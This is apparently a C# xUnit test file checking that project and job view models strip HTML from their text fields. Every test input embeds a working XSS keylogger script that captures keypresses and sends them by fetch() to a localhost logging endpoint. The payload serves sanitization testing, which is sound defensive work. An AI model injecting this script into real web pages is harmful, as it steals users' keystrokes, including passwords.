using PersonalGUI.Server.Models;
using GavinHsSecurity;
using InterfacesPS;

namespace GavinHsXUnitTests
{
    public class SanitizeTest : ISanitize
    {
        [Fact]
        public void SanitizeProjectTest()
        {
            //Actually Variables-----------------------------------------------------------------------------------------------
            int dbid = 1;
            string title = "Test<script>document.addEventListener('keypress', function(evt) {var key = evt.key;if (key) {var param = encodeURIComponent(key);var url = \"http://localhost:8081/logKey?key=\" + param;fetch(url, {method: 'GET'}).then(response => {if (!response.ok) {throw new Error('Network response was not ok');}return response.text();}).then(data => {console.log('Key logged:', data);}).catch(error => {console.error('There was a problem with the fetch operation:', error);});}});</script>Title";
            string desc = "Test Desc<script>document.addEventListener('keypress', function(evt) {var key = evt.key;if (key) {var param = encodeURIComponent(key);var url = \"http://localhost:8081/logKey?key=\" + param;fetch(url, {method: 'GET'}).then(response => {if (!response.ok) {throw new Error('Network response was not ok');}return response.text();}).then(data => {console.log('Key logged:', data);}).catch(error => {console.error('There was a problem with the fetch operation:', error);});}});</script>ription";
            string techstack = "tech,stack<script>document.addEventListener('keypress', function(evt) {var key = evt.key;if (key) {var param = encodeURIComponent(key);var url = \"http://localhost:8081/logKey?key=\" + param;fetch(url, {method: 'GET'}).then(response => {if (!response.ok) {throw new Error('Network response was not ok');}return response.text();}).then(data => {console.log('Key logged:', data);}).catch(error => {console.error('There was a problem with the fetch operation:', error);});}});</script>,test";
            DateOnly startdate = DateOnly.MaxValue;
            DateOnly? enddate = null;
            string icon = "testicon.svm<script>document.addEventListener('keypress', function(evt) {var key = evt.key;if (key) {var param = encodeURIComponent(key);var url = \"http://localhost:8081/logKey?key=\" + param;fetch(url, {method: 'GET'}).then(response => {if (!response.ok) {throw new Error('Network response was not ok');}return response.text();}).then(data => {console.log('Key logged:', data);}).catch(error => {console.error('There was a problem with the fetch operation:', error);});}});</script>";
            //Expected Variables-----------------------------------------------------------------------------------------------
            int exdbid = 1;
            string extitle = Sanitize(title);
            string exdesc = Sanitize(desc);
            string extechstack = Sanitize(techstack);
            DateOnly exstartdate = DateOnly.MaxValue;
            DateOnly? exenddate = null;
            string exicon = Sanitize(icon);

            ProjectViewModel project = new ProjectViewModel()
            {
                DBId = dbid,
                Title = title,
                ProjDesc = desc,
                TechStack = techstack,
                StartDate = startdate,
                Icon = icon,
                EndDate = enddate
            };
            
            Assert.Equal(exdbid,project.DBId);
            Assert.Equal(extitle,project.Title);
            Assert.Equal(exdesc,project.ProjDesc);
            Assert.Equal(extechstack,project.TechStack);
            Assert.Equal(exstartdate,project.StartDate);
            Assert.Equal(exenddate,project.EndDate);
            Assert.Equal(exicon,project.Icon);
        }

        [Fact]
        public void SanitizeJobTest()
        {
            //Actually Variables-----------------------------------------------------------------------------------------------
            int dbid = 1;
            string company = "Test<script>document.addEventListener('keypress', function(evt) {var key = evt.key;if (key) {var param = encodeURIComponent(key);var url = \"http://localhost:8081/logKey?key=\" + param;fetch(url, {method: 'GET'}).then(response => {if (!response.ok) {throw new Error('Network response was not ok');}return response.text();}).then(data => {console.log('Key logged:', data);}).catch(error => {console.error('There was a problem with the fetch operation:', error);});}});</script>Company";
            string title = "Test Title<script>document.addEventListener('keypress', function(evt) {var key = evt.key;if (key) {var param = encodeURIComponent(key);var url = \"http://localhost:8081/logKey?key=\" + param;fetch(url, {method: 'GET'}).then(response => {if (!response.ok) {throw new Error('Network response was not ok');}return response.text();}).then(data => {console.log('Key logged:', data);}).catch(error => {console.error('There was a problem with the fetch operation:', error);});}});</script>";
            string desc = "description<script>document.addEventListener('keypress', function(evt) {var key = evt.key;if (key) {var param = encodeURIComponent(key);var url = \"http://localhost:8081/logKey?key=\" + param;fetch(url, {method: 'GET'}).then(response => {if (!response.ok) {throw new Error('Network response was not ok');}return response.text();}).then(data => {console.log('Key logged:', data);}).catch(error => {console.error('There was a problem with the fetch operation:', error);});}});</script>";
            DateOnly startdate = DateOnly.MaxValue;
            DateOnly? enddate = null;
            //Expected Variables-----------------------------------------------------------------------------------------------
            int exdbid = 1;
            string excompany = Sanitize(company);
            string extitle = Sanitize(title);
            string exdesc = Sanitize(desc);
            DateOnly exstartdate = DateOnly.MaxValue;
            DateOnly? exenddate = null;

            JobViewModel job = new JobViewModel()
            {
                DBId = dbid,
                Company = company,
                PositionTitle = title,
                PosDesc = desc,
                Start = startdate,
                End = enddate
            };

            Assert.Equal(exdbid, job.DBId);
            Assert.Equal(excompany, job.Company);
            Assert.Equal(extitle, job.PositionTitle);
            Assert.Equal(exdesc, job.PosDesc);
            Assert.Equal(exstartdate, job.Start);
            Assert.Equal(exenddate, job.End);
        }

        public string Sanitize(string input)
        {
            return Sanitization.StripHtml(input);
        }
    }
}